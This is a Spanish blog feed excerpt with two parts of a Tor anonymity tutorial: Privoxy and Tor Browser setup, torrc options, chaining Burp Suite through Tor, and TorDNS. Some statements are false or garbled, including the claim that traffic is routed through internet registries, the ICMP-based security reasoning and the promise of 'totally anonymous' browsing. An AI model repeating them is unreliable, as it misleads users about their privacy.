&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# netstat -lntup&lt;/span&gt;
tcp &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.1:8118 0.0.0.0:* LISTEN 8520/privoxy
tcp &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.1:9050 0.0.0.0:* LISTEN 8540/tor
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Ok, los puertos están en estado de escucha, lo que significa que todo está bien, porque pueden aceptar conexiones. el único paso que nos falta es configurar nuestro navegador para que use privoxy. Un ejemplo de configuración de Firefox se presenta en la siguiente imagen:&lt;/p&gt;

&lt;figure&gt;
    &lt;img on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; class=&#34;size-medium wp-image-1027 alignnone&#34; src=&#34;https://elbauldelprogramador.com/img/2012/11/081012_1601_AchievingAn12-300x298.png&#34; alt=&#34;&#34; width=&#34;300px&#34; height=&#34;298px&#34;&gt;&lt;/img&gt;
&lt;/figure&gt;

&lt;p&gt;Podemos ver que configuramos el navegador para conectarse a traves del proxy que está corriendo en IP 127.0.0.1 y el puerto 8118, el cual es exactamente nuestro proxy Privoxy. Así nuestro navegador web se conecta a Privoxy, el cual se conecta en turnos a Tor, que nos permite navegar en Internet anónimamente.&lt;/p&gt;

&lt;p&gt;Verifiquemos si el navegador está efectivamente usando la red Tor para navegar en internet de manera anónima. Podemos hacerlo visitando la URI &lt;a href=&#34;http://check.torproject.org/&#34; target=&#34;_blank&#34;&gt;Check Torproject&lt;/a&gt;. Si ves algo como la siguiente imagen, entonces hemos configurado Tor exitosamente y podemos navegar en Internet de forma anónima.&lt;/p&gt;

&lt;figure&gt;
    &lt;img on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; src=&#34;https://elbauldelprogramador.com/img/2012/11/081012_1601_AchievingAn21-300x86.png&#34; alt=&#34;&#34; width=&#34;300px&#34; height=&#34;86px&#34;&gt;&lt;/img&gt;
&lt;/figure&gt;

&lt;p&gt;En vez de configurarlo manualmente, también podemos usar Tor Browser Bundle, el cual integra prácticamente todo lo que necesitamos. Simplemente tenemos que descargar Tor Browser Bundle, extraerlo y ejecutar el script start-for-browser, de la siguiente manera:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# tar -xvzf tor-browser-gnu-linux-x86_64-2.2.37-1-dev-en-US.tar.gz&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# cd tor-browser_en-US&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# ./start-tor-browser&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Este script primero inicia Vidalia, que es un QT frontend para Tor y se ve así:&lt;/p&gt;

&lt;figure&gt;
    &lt;img on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; src=&#34;https://elbauldelprogramador.com/img/2012/11/081012_1601_AchievingAn31-284x300.png&#34; alt=&#34;&#34; width=&#34;284px&#34; height=&#34;300px&#34;&gt;&lt;/img&gt;
&lt;/figure&gt;

&lt;p&gt;En esta imagen podemos ver que nos conectamos exitosamente a la red Tor (se conecta cuando se inicia Vidalia). Si clickeamos en &amp;#8220;View the Network&amp;#8221; (Ver la Red), obtendremos una lista de todos los nodos online que la red Tor está usando - esto puede estar más actualizado en &lt;a href=&#34;http://torstatus.all.de/index.php?SR=Bandwidth&amp;SO=Desc&#34; target=&#34;_blank&#34;&gt;Nodos Tor&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;El script tambien abrirá el navegador web Tor una vez que nos conectemos con éxito a la red Tor. Este navegador está basado en Firefox y se ve como en la siguiente imagen:&lt;/p&gt;

&lt;figure&gt;
    &lt;img on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; src=&#34;https://elbauldelprogramador.com/img/2012/11/081012_1601_AchievingAn41-300x86.png&#34; alt=&#34;&#34; width=&#34;300px&#34; height=&#34;86px&#34;&gt;&lt;/img&gt;
&lt;/figure&gt;

&lt;p&gt;Podemos ver que nuestro navegador está usando efectivamente la red Tor y podemos navegar en Internet de manera anónima.&lt;/p&gt;

&lt;h2 id=&#34;2-cómo-funciona-tor&#34;&gt;2. Cómo funciona Tor&lt;/h2&gt;

&lt;p&gt;Antes de describir cómo funciona Tor, debemos saber cómo funciona la internet moderna. Cuando visitamos un sitio web como &lt;a href=&#34;http://www.google.com&#34; target=&#34;_blank&#34;&gt;Google&lt;/a&gt; estamos enviando una petición a uno de los servidores web de Google. Pero esto no sucede directamente de nuestra computadora al servidor de Google. Lo que ocurre es que nosotros enviamos la petición primero a nuestro router, seguido por el ISP (Internet Service Provider), el cual la reenvía a uno de los NIRs (National Internet Registries), que se encarga de reenviarla a uno de los LIRs (Local Internet Registries), que a su vez la reenvía a uno de los RIRs (Regional Internet Registries), etc, hasta que eventualmente el proceso es revertido una vez que la petición alcanzó el destino - el servidor de Google. Puede observarse esto usando el programa Traceroute que envía paquetes con un valor específico de TTL (Time to Live), que expira en cada salto (TTL es aumentado en 1 cada vez que el paquete es enviado para asegurar que expira) entre nuestro cliente y el servidor, revelando la identidad de cada nodo. Para encontrar todos los nodos que el paquete tiene que visitar cuando viaja a traves de Internet al servidor web de Google, podemos ejecutar el comando siguiente:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# traceroute www.google.com&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;El problema básico con esto es que todos los nodos intermediarios pueden monitorear nuestros paquetes transmitidos a traves de Internet. Incluso si usamos una conexión encriptada (HTTPS), algunos datos todavía pueden ser accedidos simplemente mirando en el encabezado TCP, como la IP de origen, la IP destino, tamaño de carga, tiempo de comunicación, etc.&lt;/p&gt;

&lt;p&gt;¿Pero qué pasa si estamos usando Tor en el principio de la red? No podemos realmente ejecutar Traceroute cuando estamos usando Tor, dada la forma en que Tor fue diseñado. Dado que Tor no puede manejar paquetes ICMP (ping), no hay forma de saber a dónde serán dirigidos los paquetes. Esto es lo que hace que Tor sea seguro. Cuando estamos usando nuestro navegador conectado a la red Tor, estamos enviando peticiones a través de Internet usando el primer nodo de Tor, el cual la reenvía al siguiente nodo y el siguiente al siguiente, hasta que finalmente alcanza el destino.&lt;/p&gt;

&lt;p&gt;En la red Tor, todavía necesitamos enviar nuestros paquetes a nuestra red personal, luego al ISP, dado que es nuestro proveedor de servicios de internet; sin ello, no podríamos incluso usar Internet. Pero adicionalmente, nuestros paquetes son además dirigidos a traves de la red Tor, donde son aleatoriamente dirigidos a nodos seguros. esto permite que nuestro tráfico no sea visto por un hábil atacante y el gobierno que está monitoreando el tráfico en cualquier ubicación en Internet.&lt;/p&gt;

&lt;p&gt;El cliente conectado a la red Tor primero necesita una lista de nodos de Tor que puede ser obtenida de el servidor directorio. Podemos ver los nodos disponibles de Tor visitando &lt;a href=&#34;http://torstatus.all.de/index.php?SR=Bandwidth&amp;SO=Desc&#34; target=&#34;_blank&#34;&gt;Tor Nodes&lt;/a&gt;, donde podemos encontrar bastante información sobre los nodos de Tor, incluyendo hostname, router name, uptime, ancho de banda disponible, etc.&lt;/p&gt;

&lt;p&gt;Después de que el cliente ha obtenido dicha lista, necesita construir un circuito de conexiones entre los nodos de la red Tor. Cada conexión entre los nodos subsecuentes en un circuito es encriptado con diferentes claves de encriptación, por lo tanto cada nodo sólo conoce el anterior y el siguiente nodo en el circuito. Deberíamos mencionar además que Tor trabaja sobre el protocolo TCP y puede ser usado por cualquier aplicación que pueda ser configurada para enviar su tráfico a través de un proxy SOCKS. Esto no es totalmente correcto debido a que podemos torificar la aplicación con el uso de tsocks, lo cual describiremos en uno de los artículos subsiguientes.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Entonces al fin y al cabo, la red Tor provee una manera de esconder el vínculo entre la dirección origen y destino de una conexión dada. Por lo tanto, un intruso no puede determinar de dónde viene la información y hacia dónde va, lo que nos convierte en anónimos.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Pero la pregunta persiste: ¿puede realmente volvernos anónimos? La respuesta es sí y no. Necesitamos recordar que todos los paquetes que son enviados de nuestro cliente al servidor serán encriptados en el servidor. Esto realmente tiene sentido por cómo el servidor usaría la información y haría algo con ella si ésta fuera encriptada. En consecuencia, Tor provee anonimato sobre internet, pero no puede proveer los medios para mantenerte anónimo al servidor que está recibiendo la información.&lt;/p&gt;

&lt;p&gt;Describamos esto un poco más. Si estamos enviando paquetes que contienen nuestro nombre de usuario, nombre de dominio o alguna otra información que indica nuestra presencia, entonces la máquina objetivo sabrá quiénes somos, aunque algún intruso que esté escuchando en un nodo intermediario tal vez no. Esto se reduce a lo siguiente:&lt;/p&gt;

&lt;p&gt;En cada conexión a través de la red Tor, necesitamos tener en cuenta que a la información:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;El cliente la envía&lt;/li&gt;
&lt;li&gt;Internet la direcciona&lt;/li&gt;
&lt;li&gt;El servidor la recibe&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Con Tor, podemos asegurarnos que Internet aunque canaliza la información, no tiene idea sobre la dirección origen ni destino que usamos, lo cual es crucial para mantener el anonimato sobre Internet. Pero la información enviada de un cliente hacia un servidor son visibles en los dos extremos de la conexión. Por lo tanto, para ser verdaderamente anónimos, incluso en la máquina destino, necesitamos no encapsular ninguna información sensible en el paquete de datos del tráfico entre el cliente y el servidor.&lt;/p&gt;

&lt;p&gt;Con motivo de esconder la información del nivel de aplicación que pueda comprometer nuestro anonimato, podemos usar &lt;a href=&#34;https://www.torproject.org/torbutton/&#34; target=&#34;_blank&#34;&gt;Torbutton&lt;/a&gt;, una extensión de Firefox que inhabilita muchos posibles filtrados de información que nos puedan comprometer. O lo que es mejor, podemos usar&lt;a href=&#34;https://www.torproject.org/projects/torbrowser.html.en&#34; target=&#34;_blank&#34;&gt; Tor browser bundle&lt;/a&gt;, el cual usa Vidalia para configurar e iniciar Tor. Éste además abre el navegador Web Tor con Torbutton integrado, el que podemos usar para buscar anónimamente en internet.&lt;/p&gt;

&lt;h2 id=&#34;3-variables-de-configuración-de-tor&#34;&gt;3. Variables de configuración de Tor&lt;/h2&gt;

&lt;p&gt;Presentemos lo que el manual dice sobre las variables de configuración que usamos en este artículo:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;AvoidDiskWrites&lt;/strong&gt;: Si es distinto de cero, intenta escribir en el disco con menos frecuencia. Esto es útil cuando usamos memoria flash u otro dispositivo que soporta solo un limitado número de escrituras. (Default: 0)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ControlPort&lt;/strong&gt;: Si está seteado, Tor aceptará conexiones en este puerto y permitirá a esas conexiones controlar el proceso de Tor usando el protocolo &amp;#8220;Tor Control Protocol&amp;#8221; (descripto en control-spec.txt) Nota: a menos que especifiques también uno o más HashedControlPassword o CookieAuthentication, seteando esta opción causará que Tor permita que cualquier proceso en el localhost lo controle. (Setear ambos métodos de autenticación significa que cualquiera de los dos es suficiente para autenticar Tor). Esta opción es requerida por muchos controladores de Tor; muchos usan el valor 9051. Setealo en &amp;#8220;auto&amp;#8221; para dejar que Tor elija un puerto por vos. (Default: 0)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Log&lt;/strong&gt;: Envía todos los mensajes a la salida standard, a la salida de error standard, o al log del sistema (el valor de &amp;#8220;syslog&amp;#8221; sólo lo provee Unix). Reconocidos niveles de severidad son debug, info, notice, warn y err. Recomendamos usar &amp;#8220;notice&amp;#8221; en la mayoría de los casos, debido a que algo más verborrágico podría proveer información sensible a un atacante que obtenga los logs. Si se da solo un nivel de severidad, todos los mensajes de ese nivel o uno mayor serán enviados al destino listado.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SocksListenAddress&lt;/strong&gt;: Bindea hacia esta dirección para esperar por conexiones de aplicaciones de Socks-speaking. (Default: 127.0.0.1) Puedes especificar incluso un puerto (e.g. 192.168.0.1:9100) esta directiva puede ser especificada múltiples veces para bindear múltiples direcciones/puertos.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SocksPort&lt;/strong&gt;: Activa este puerto para esperar conexiones de aplicaciones Socks-speaking. Configuralo en 0 si no quieres permitir conexiones con aplicaciones vía SOCKS. Configuralo en &amp;#8220;auto&amp;#8221; para dejar que Tor seleccione un puerto por vos. (Default: 9050)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;4-configurar-resolución-dns-de-forma-segura&#34;&gt;4. Configurar resolución DNS de forma segura&lt;/h2&gt;

&lt;p&gt;La única cosa que debemos realmente observar cuando usamos Tor es la resolución de DNS. Usualmente nuestra máquina cliente está usando nuestros propios servidores DNS, los cuales en turnos usan los servidores DNS del ISP, por lo tanto un intruso puede todavía obtener la IP origen y destino con el que nos estamos comunicando. Este es un comportamiento no deseado, porque el servidor DNS ve qué hostname estamos intentando resolver y conectarnos, lo que puede derivar en una revelación de usuario.&lt;/p&gt;

&lt;p&gt;Nuestro navegador web usa un proxy SOCKS para conectarse a Tor. Debemos saber qué tipo de proxies SOCKS existen. Hay tres tipos de proxies SOCKS, listados a continuación:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;SOCKS 4: usa direcciones IP&lt;/li&gt;
&lt;li&gt;SOCKS 4a: usa hostnames&lt;/li&gt;
&lt;li&gt;SOCKS 5: usa direcciones IP y hostnames&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para probar si estamos resolviendo hostnames de forma local o remota, podemos editar la configuración torrc agregándole las siguientes líneas al archivo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;TestSocks 1
SafeSocks 1
WarnUnsafeSocks 1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;TestSocks:&lt;/strong&gt; Cuando está activada esta opción, Tor genera una entrada en el log notice-level por cada conexión al puerto Socks indicando si la petición usó un protocolo de socks seguro o uno inseguro (mira lo comentado en SafeSocks). esto ayuda a determinar si una aplicación que usa Tor está posiblemente filtrando las peticiones DNS. (Default: 0)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;SafeSocks&lt;/strong&gt;: Cuando está activada esta opción, Tor rechazará conexiones a aplicaciones que usan variantes no seguras de protocolo de socks - una que solo provea una dirección IP, significa que la aplicación está resolviendo el DNS primero. Más específicamente, estos son socks4 y socks5 cuando no lo hace el servidor DNS remoto. (Defaults: 0)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;WarnUnsafeSocks&lt;/strong&gt;: Cuando está activada esta opción, Tor alertará cuando una petición recibida sólo contiene una dirección IP en lugar de un hostname. Permitirle a aplicaciones que resuelvan sus DNS es usualmente una mala idea y puede proveer tu ubicación a atacantes. (Default: 1)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;En el próximo artículo describiremos cómo configurar el mecanismo de resolución de DNS para evitar cualquier posible robo de información.&lt;/p&gt;

&lt;h2 id=&#34;5-conclusión&#34;&gt;5. Conclusión&lt;/h2&gt;

&lt;p&gt;Podemos ver que si somos cuidadosos podemos ser totalmente anónimos en Internet. Debemos vigilar que no resolvamos los hostnames de forma local y debemos no incluir información sensible en los datos de una aplicación que pueda desenmascararnos. Si cumplimos con esto, podemos realmente navegar de manera anónima en Internet.&lt;/p&gt;

&lt;h3 id=&#34;referencias&#34;&gt;Referencias:&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Manual de Tor, &lt;a href=&#34;https://www.torproject.org/docs/tor-manual.html.en&#34; target=&#34;_blank&#34;&gt;&lt;a href=&#34;https://www.torproject.org/docs/tor-manual.html.en&#34;&gt;https://www.torproject.org/docs/tor-manual.html.en&lt;/a&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Infosec&lt;/em&gt; »» &lt;a href=&#34;http://resources.infosecinstitute.com/tor-part-1/&#34; target=&#34;_blank&#34;&gt;Visitar sitio&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
        </item>
        
        <item>
            <title>Logrando el anonimato con Tor (Parte 2) : Proxies y servidores de DNS</title>
            <link>https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-2-proxies-y-servidores-de-dns/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-2-proxies-y-servidores-de-dns/</guid>
            <description>&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-1/&#34; target=&#34;_blank&#34;&gt;Logrando el anonimato con Tor (Parte 1)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Logrando el anonimato con Tor (Parte 2): Servidores DNS y Proxies&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-3-torbutton-y-tsocks/&#34; title=&#34;Logrando el anonimato con Tor (Parte 3) : Torbutton y Tsocks&#34;&gt;Logrando el anonimato con Tor (Parte 3): TorButton y Tsocks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-4/&#34; title=&#34;Logrando el anonimato con Tor (Parte 4) – Tor para relés&#34;&gt;Logrando el anonimato con Tor (Parte 4): Tor para relés&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;1-usando-burp-con-tor&#34;&gt;1. Usando Burp con Tor&lt;/h2&gt;

&lt;p&gt;Ya hemos visto en profundidad cómo configurar nuestro navegador web para usar Privoxy, el cual en turnos usa Tor para mantener el anonimato en internet. ¿Pero qué pasa si queremos interceptar peticiones con Burp? Para comprender mejor qué sucede, la imagen siguiente representa la cadena de nodos que cada petición (y respuesta) debe atravesar parapoder usar el proxy (en nuestro caso, Burp) sobre la red de Tor:&lt;/p&gt;

&lt;figure&gt;
    &lt;img on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; alt=&#34;diagrama de nodos&#34; src=&#34;https://elbauldelprogramador.com/img/2012/12/081012_1604_AchievingAn11.png&#34; width=&#34;300px&#34; height=&#34;128px&#34;&gt;&lt;/img&gt;
&lt;/figure&gt;

&lt;p&gt;Se puede observar que cada petición del navegador primero pasa por algún proxy (en nuestro caso Burp), el cual nos permite hacer algo con ella - en la mayoría de los casos es inspeccionar los parámetros del GET/POST y modificarlos un poco. Las peticiones luego son pasadas a la red anónima de Tor (la cual ya es parte de internet, pero en la imagen se representa Internet en un propio nodo por claridad).&lt;/p&gt;

&lt;p&gt;Esa es una visión general de cómo deberían trabajar todos en conjunto, pero todavía falta configurar todos los componentes para que funcionen juntos correctamente. Primero se debe instalar Burp Suite (No se considera necesario detallar los pasos para ello). Cuando Burp está inicializado, se debe ver el puerto 8080 abierto y en estado LISTEN:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;$ netstat -lntup tcp6 &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.1:8080 :::* LISTEN 4315/java
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;

&lt;p&gt;Dado que el navegador web debería enviar todas las peticiones a Burp, es necesario configurar el navegador web para que use Burp en lugar de Privoxy. La configuración para Firefox se presenta a continuación:&lt;/p&gt;

&lt;figure&gt;
    &lt;img on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; alt=&#34;081012_1604_AchievingAn2&#34; src=&#34;https://elbauldelprogramador.com/img/2012/12/081012_1604_AchievingAn21.png&#34; width=&#34;501px&#34; height=&#34;498px&#34;&gt;&lt;/img&gt;
&lt;/figure&gt;

&lt;p&gt;De esta forma Firefox envía todos los paquetes a través del proxy Burp, que corre en el host 127.0.0.1 en el puerto 8080.&lt;/p&gt;

&lt;p&gt;A continuación es necesario configurar Burp para usar proxy SOCKS, el cual se inicializa y configura a través de Tor. El proxy SOCKS trabaja en un nivel más bajo que el proxy HTTP, por lo tanto tiene la posibilidad de redirigir no sólo peticiones HTTP. SOCKS es básicamente un proxy TCP, el cual puede interceptar y filtrar todas las conexiones TCP que pasan a través de él, lo que le permite no ser específico por aplicación; la aplicación sólo necesita tener la capacidad de enviar sus paquetes de datos a través del proxy SOCKS. Es posible configurar Burp para usar SOCKS en las opciones de Burp indicando &amp;#8220;use SOCKS proxy&amp;#8221;, como se puede observar en la siguiente imagen:&lt;/p&gt;

&lt;figure&gt;
    &lt;img on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; alt=&#34;081012_1604_AchievingAn3&#34; src=&#34;https://elbauldelprogramador.com/img/2013/01/081012_1604_AchievingAn32.png&#34; width=&#34;642px&#34; height=&#34;234px&#34;&gt;&lt;/img&gt;
&lt;/figure&gt;

&lt;p&gt;De esta forma se configura Burp para que use el proxy SOCKS corriendo en el host 127.0.0.1 (localhost) en el puerto 9050. Si se consultan nuevamente los puertos que estan en estado de escucha nuevamente, se puede observar que el puerto 9050 está asociado al servicio Tor:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# netstat -lntup&lt;/span&gt;
tcp &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; 127.0.0.1:9050 0.0.0.0:* LISTEN 8520/tor
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Repasando, hemos configurado el navegador para que use el proxy Burp en el puerto 8080, el cual en turnos utiliza el proxy SOCKS en el puerto 9050, razón por la cual exitosamente se logra el encadenamiento de proxies y en consecuencia se navega en internet de manera anónima, mientras seguimos teniendo la ventaja de poder modificar las peticiones con Burp.&lt;/p&gt;

&lt;h2 id=&#34;2-configurar-tor-para-resolver-los-hostnames-de-forma-segura&#34;&gt;2. Configurar Tor para resolver los hostnames de forma segura&lt;/h2&gt;

&lt;p&gt;En el artículo anterior aparecen los tipos de proxies SOCKS y algunas variables de configuración de Tor que se pueden usar en el archivo de configuración torrc. Además se debate porqué es importante resolver los hostnames de forma segura. Para revisar esta información visita la &lt;a href=&#34;https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-1/&#34; target=&#34;_blank&#34;&gt;parte 1&lt;/a&gt;. Para continuar profundizando, analizaremos cómo configurar Tor para resolver los hostnames de forma segura.&lt;/p&gt;

&lt;p&gt;Para realizarlo, disponemos de las siguientes soluciones:&lt;/p&gt;

&lt;h3 id=&#34;a-usar-socks4a&#34;&gt;A: &lt;strong&gt;Usar SOCKS4a&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;No todas las aplicaciones soportan SOCKS4a, por lo tanto esta solución no es del todo viable, ya que necesitamos una solución universal que funcione con todas las aplicaciones.&lt;/p&gt;

&lt;h3 id=&#34;b-torificar-la-resolución-de-hostnames&#34;&gt;B: *&lt;strong&gt;Torificar* la resolución de hostnames&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;Es posible intentar &lt;em&gt;torificar&lt;/em&gt; la aplicación de resolución de DNS que utilizamos. Pero es necesario tener cuidado, debido a que algunas aplicaciones no fueron construidas pensando en el modo anónimo. Algunos protocolos, como FTP (modo activo/pasivo), envían la propia dirección IP en la sección de datos del FTP, lo que lo hace muy difícil de anonimizar. Esto ocurre en el modo activo del data transfer en FTP. La siguiente imagen resume la inicialización de la trasferencia FTP:&lt;/p&gt;

&lt;figure&gt;
    &lt;img on=&#34;tap:lightbox1&#34; role=&#34;button&#34; tabindex=&#34;0&#34; layout=&#34;responsive&#34; alt=&#34;081012_1604_AchievingAn4&#34; src=&#34;https://elbauldelprogramador.com/img/2013/01/081012_1604_AchievingAn42.png&#34; width=&#34;591px&#34; height=&#34;245px&#34;&gt;&lt;/img&gt;
&lt;/figure&gt;

&lt;p&gt;Se pueden observar todos los pasos necesarios para empezar a enviar la información del servidor al cliente. Parece no ser mucho si no se presta atención. En el paso C, se envía el comando PORT, el cual es la raiz de los problemas para anonimizar. El comando PORT usa un formato como el siguiente:&lt;/p&gt;

&lt;p&gt;PORT x,x,x,x,y,y donde x representa la IP del cliente y la y representa el puerto elegido que puede ser usado para la transferencia de datos. Por lo tanto en este caso el cliente revela su dirección IP perdiendo así su anonimato. Casos como estos hay que tener en cuenta al momento de &lt;em&gt;torificar&lt;/em&gt; una aplicación.&lt;/p&gt;

&lt;p&gt;No está relacionado directamente con el esquema de resolución de DNS, pero vale la pena nombrarlo ya que está relacionado con la utilización de Tor en una aplicación.&lt;/p&gt;

&lt;h3 id=&#34;c-usar-tor-resolve&#34;&gt;C: &lt;strong&gt;Usar tor-resolve&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;Con tor-resolve se puede obtener la dirección IP de un hostname de manera muy sencilla. Todo lo que se necesita hacer es correr este programa con el hostname especificado, por ejemplo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# tor-resolve www.google.com 127.0.0.1:9050&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Este comando dice que queremos obtener la dirección IP del hostname www.google.com, y que queremos usar el proxy SOCKS de Tor corriendo en el host 127.0.0.1 en el puerto 9050, la cual es la combinación host:port default, pero la especificamos igual, por claridad.&lt;/p&gt;

&lt;p&gt;D: &lt;strong&gt;Usar el servidor DNS local TorDNS&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;El servidor DNS local puede ser configurado, el cual direccionará todas las peticiones DNS através de la red de Tor. Tor provee un servidor DNS built-in, el cual puede ser setteado agregando variables de configuración al archivo /etc/tor/torrc . Más específicamente, es necesario agregar las siguientes variables:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;DNSPort 53
AutomapHostsOnResolve 1
AutomapHostsSuffixes .exit,.onion
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Para probar si TorDNS funciona, se puede usar el comando dig para consultarle a nuestro servidor DNS por una dirección IP. Por ejemplo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;# dig @localhost -p 53 www.google.com&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Para asegurarnos que todas las peticiones DNS son realmente enviadas a través de nuestro servidor DNS local, es necesario además cambiar el archivo /etc/resolv.conf para apuntar al servidor DNS 127.0.0.1:53, por lo tanto todas las aplicaciones de la máquina usarán el sevidor DNS TorDNS para la resolución de hostnames. Si hacemos esto, notaremos un poco de retardo cuando consultemos un hostname que todavía no esté en caché, pero con las conecciones de internet actuales esto no debería ser un problema. Pero si de todos modos molesta, podemos configurar un servidor de nombres local para cacheo que podría almacenar los hostnames y sus correspondientes direcciones IP. En Linux hay un programa llamado dnsmasq, el cual es un servidor liviano de cacheo de DHCP y DNS, entre otros, el cual acepta consultas DNS y las responde directamente de la caché local o las redirecciona a un servidor DNS real. Una buena explicación de ello puede encontrase en &lt;a href=&#34;https://elbauldelprogramador.com/logrando-el-anonimato-con-tor-parte-3-torbutton-y-tsocks/&#34; title=&#34;Logrando el anonimato con Tor (Parte 3) : Torbutton y Tsocks&#34;&gt;1&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Es necesario además asegurar que etc/resolv.conf no cambió para la próxima vez que los programas dhclient o dhcpcd estén corriendo. Para inhabilitar los cambios de dhclient sobre resolv.conf con sus propios nameservers, es necesario borrar el domain-name, domain-name-servers ydomain-search del archivo de configuración /etc/dhcp3/dhclient.conf . Para inhabilitar los cambios de dhcpcd en resolv.conf, es necesario borrar domain_name, domain_name_servers y domain_server del archivo de configuración /etc/dhcpcd.conf. Si tenemos ambos programas instalados, cambiar ambos archivos adecuadamente probablmente sea lo mejor.&lt;/p&gt;

